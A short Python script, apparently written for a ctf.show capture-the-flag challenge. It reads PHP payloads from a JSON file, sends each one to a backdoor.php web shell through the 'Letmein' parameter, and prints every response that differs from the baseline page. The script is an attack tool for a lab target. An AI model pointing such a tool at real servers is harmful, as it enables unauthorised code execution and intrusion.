import string

import json

from requests_html import HTMLSession

url = 'http://fa1f669b-39f3-43dc-a556-c8725881aa1a.challenge.ctf.show:8080/backdoor.php'
cmd = 'Letmein'
method = 'post'
exclude = '<!-- 36D姑娘留的后门，闲人免进 -->\r\n'
s = HTMLSession()


def main():
    obj = init()
    for k, v, in obj.items():
        v = v + ';'
        if method == 'get':
            res = s.get(f'{url}?{cmd}={v}')
        else:
            res = s.post(url, data={cmd: v})

        if exclude and res.text == exclude:
            continue
        print(k.center(24, '-') + '\n',  res.text)



def init():
    jso = open('php_fuzz.json', 'r').read()
    r = json.loads(jso)
    return r


if __name__ == '__main__':
    main()
